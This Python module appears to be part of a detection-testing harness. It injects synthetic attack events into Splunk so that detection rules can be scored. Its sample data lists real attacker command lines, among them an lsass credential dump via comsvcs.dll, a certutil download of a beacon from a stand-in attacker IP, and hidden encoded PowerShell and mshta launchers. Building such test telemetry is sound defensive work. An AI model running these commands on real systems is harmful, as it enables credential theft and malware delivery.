import time
import random
import copy
from splunk_client.hec import HECClient

# Realistic placeholder values modeled on actual enterprise environments
# Users: domain\user format matching real AD environments
_SAMPLE_USERS = [
    "jsmith", "a.davis", "m.wilson", "r.thomas", "svc_backup", "svc_monitor",
    "helpdesk01", "itadmin", "dbuser", "appservice",
]
# Attacker IPs: mix of RFC1918 (pivot host) and external (VPN/proxy exit)
_SAMPLE_IPS = [
    "10.10.14.23", "10.10.14.47", "192.168.100.45", "172.16.8.12",
    "185.220.101.45", "45.33.32.156", "198.51.100.22",
]
_SAMPLE_HOSTS = [
    "CORP-WS-042", "CORP-WS-117", "SRV-FILE-01", "SRV-DC-01",
    "LAPTOP-SALES-07", "DEV-BUILD-03", "SRV-SQL-02",
]
# LOLBins and real attacker tooling — names that blend with legitimate software
_SAMPLE_TASKS = [
    "\\Microsoft\\Windows\\WDI\\ResolutionHost",          # masquerades as WDI
    "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",       # masquerades as Defrag
    "MicrosoftEdgeUpdateTaskMachineUA",                    # masquerades as Edge Update
    "\\GoogleUpdateTaskMachineCore",                       # masquerades as Google Update
    "OneDrive Standalone Update Task v2",                  # masquerades as OneDrive
]
# Real attacker payloads: LOLBins, encoded PS, common RAT paths
_SAMPLE_CMDS = [
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W Hidden -Exec Bypass -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAoAA==",
    "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 640 C:\\Windows\\Temp\\lsass.dmp full",
    "C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://10.10.14.23/beacon.exe C:\\ProgramData\\beacon.exe",
    "C:\\Windows\\System32\\mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"powershell -enc JABj\"\",0,True)(window.close)\")",
    "C:\\Users\\Public\\svchost32.exe",   # renamed tool in Public
]
# Attacker tools — realistic renamed/staging paths
_SAMPLE_PROCS = [
    "C:\\Windows\\Temp\\svchost.exe",          # renamed tool
    "C:\\ProgramData\\Intel\\sysinfo.exe",      # vendor-masquerade path
    "C:\\Windows\\System32\\rundll32.exe",      # LOLBin
    "C:\\Users\\Public\\Music\\update.exe",     # user-writable path
    "C:\\Windows\\Temp\\dllhost.exe",           # renamed tool
]
# Registry key names that look like legitimate software
_SAMPLE_REG_KEYS = [
    "MicrosoftEdgeAutoLaunch",
    "OneDriveSetup",
    "SecurityHealthSystray",
    "CTFMon",
    "AdobeAAMUpdater",
]

# Spec-level keys that control injection behavior — not injected as event fields
_SPEC_KEYS = {"count", "spread_seconds"}

# Hard caps on mutation ranges — prevent trivially cheating the detection window
_MAX_COUNT = 200          # cap injected events per spec
_MAX_SPREAD_SECONDS = 90  # cap timing spread so events stay within the round window


def _make_context() -> dict:
    """
    Sample placeholder values once per event spec so all events in the same burst
    share attacker IP, target user, etc. This makes threshold rules work AND
    models real attack realism (one session = one source IP).
    """
    hosts = random.sample(_SAMPLE_HOSTS, min(2, len(_SAMPLE_HOSTS)))
    return {
        "target_user": random.choice(_SAMPLE_USERS),
        "attacker_ip": random.choice(_SAMPLE_IPS),
        "workstation": hosts[0],
        "target_host": hosts[1] if len(hosts) > 1 else hosts[0],
        # Backdoor account: looks like a service account
        "new_account": f"svc_{random.choice(['backup','monitor','update','health'])}_{random.randint(10,99)}",
        "creating_user": random.choice(_SAMPLE_USERS),
        "task_name": random.choice(_SAMPLE_TASKS),
        "malicious_command": random.choice(_SAMPLE_CMDS),
        "dumper_process": random.choice(_SAMPLE_PROCS),
        "setting_process": random.choice(_SAMPLE_PROCS),
        "reg_key_name": random.choice(_SAMPLE_REG_KEYS),
        # Password spray: 4 distinct accounts targeted from same IP
        "spray_user_2": random.choice(_SAMPLE_USERS),
        "spray_user_3": random.choice(_SAMPLE_USERS),
        "spray_user_4": random.choice(_SAMPLE_USERS),
        # Realistic process IDs, thread IDs, logon GUIDs
        "logon_guid": "{" + "-".join([f"{random.randint(0,0xFFFF):04X}" for _ in range(5)]) + "}",
        "process_id": f"0x{random.randint(0x400,0x3000):04x}",
        # Realistic GrantedAccess masks used by real dump tools
        "granted_access": random.choice(["0x1fffff", "0x143a", "0x1010", "0x1038"]),
    }


def _fill_template(template: dict, ctx: dict) -> dict:
    """Replace {placeholder} strings using a pre-sampled context dict."""
    result = {}
    for k, v in template.items():
        if isinstance(v, str):
            for placeholder, value in ctx.items():
                v = v.replace(f"{{{placeholder}}}", value)
        result[k] = v
    return result


class Injector:
    """
    Instantiates attack templates and injects events into Splunk via HEC.
    Each event gets arena_round and technique_id fields for scoring.

    Timestamps: _time is set per-event and promoted to the HEC envelope
    by HECClient so Splunk stores the correct per-event timestamp.
    """

    def __init__(self, hec: HECClient, index: str):
        self.hec = hec
        self.index = index

    def inject_technique(
        self,
        technique_def: dict,
        round_num: int,
        overrides: dict = None,
    ) -> list[dict]:
        """
        Inject all events for a technique definition.
        overrides: field overrides from the mutator.
          - Spec-level keys (count, spread_seconds) adjust injection behavior.
          - All other keys are merged into the event template fields.
        Returns the list of injected events (for scoring reference).
        """
        overrides = overrides or {}
        technique_id = technique_def["technique_id"]
        injected = []

        now = time.time()

        # Separate spec-level overrides from field-level overrides
        spec_overrides = {k: v for k, v in overrides.items() if k in _SPEC_KEYS}
        field_overrides = {k: v for k, v in overrides.items() if k not in _SPEC_KEYS}

        for event_spec in technique_def["events"]:
            sourcetype = event_spec["sourcetype"]
            template = copy.deepcopy(event_spec["template"])

            # Apply field-level LLM overrides before filling placeholders
            template.update(field_overrides)

            # Spec-level overrides can change count and timing (capped to prevent cheating the window)
            count = min(int(spec_overrides.get("count", event_spec.get("count", 1))), _MAX_COUNT)
            spread = min(float(spec_overrides.get("spread_seconds", event_spec.get("spread_seconds", 1))), _MAX_SPREAD_SECONDS)

            # Sample context ONCE per spec so all events in the burst share the same IP/user/etc.
            # This makes threshold rules work (80 events from same IP triggers brute force).
            ctx = _make_context()

            events_to_send = []
            for i in range(count):
                ev = _fill_template(template, ctx)
                ev["arena_round"] = round_num
                ev["arena_technique"] = technique_id
                # Spread events backwards in time to simulate a real attack burst.
                # _time is promoted to the outer HEC envelope by HECClient.
                ev["_time"] = now - (spread * (count - i) / max(count, 1))
                events_to_send.append(ev)

            self.hec.send_events(events_to_send, index=self.index, sourcetype=sourcetype)
            injected.extend(events_to_send)

        return injected
